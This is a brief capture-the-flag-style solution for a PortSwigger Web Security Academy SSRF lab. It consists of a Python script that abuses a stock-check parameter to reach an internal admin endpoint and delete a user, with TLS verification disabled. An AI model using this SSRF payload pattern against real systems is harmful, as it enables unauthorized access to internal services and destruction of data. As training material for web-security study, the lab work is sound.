# Lab: Basic SSRF against another back-end system

Link to lab: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

## Solution
```python
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

data = 'stockApi=http://192.168.0.151:8080/admin/delete?username=carlos'

response = requests.post(
    'https://0abb00ce03698edbc1b380e7009400f4.web-security-academy.net/product/stock',
    headers=headers,
    data=data,
    verify=False,
    allow_redirects=False
)

print(response.text)
```